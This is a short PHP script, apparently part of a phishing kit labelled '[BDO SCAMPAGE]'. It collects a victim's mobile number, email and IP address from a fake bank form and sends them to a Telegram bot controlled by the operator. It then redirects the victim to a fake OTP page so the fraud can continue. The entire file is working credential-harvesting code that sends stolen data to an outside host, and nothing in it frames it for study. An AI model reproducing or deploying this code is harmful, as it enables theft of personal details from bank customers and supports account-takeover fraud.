<?php
include("../settings/config.php");
   
   
  $num = $_POST['_mobilenum_'];
  $mails = $_POST['_email_'];
    
        $request_params = [
            "chat_id" => $user_id,
            "text" => "[BDO SCAMPAGE] \n\n [+] Add Device [+]\n[+] IP: ".$_SERVER['REMOTE_ADDR']."\n[+] Number: $num\n[+] Email: ".$mails
        ];
        $request_url = "https://api.telegram.org/bot".$token."/sendMessage?".http_build_query($request_params);
        file_get_contents($request_url);


function generateRandomString($length) {
    $include_chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    /* Uncomment below to include symbols */
    /* $include_chars .= "[{(!@#$%^/&*_+;?\:)}]"; */
    $charLength = strlen($include_chars);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $include_chars [rand(0, $charLength - 1)];
    }
    return $randomString;
}
 
// Call function
$lenght = 100; # Set result string lenght
$codebash = generateRandomString($lenght);

$numb = substr($num, 8);

header("location:../otp2?param1=true&auth=$codebash&number=$numb&code=$codebash");
?>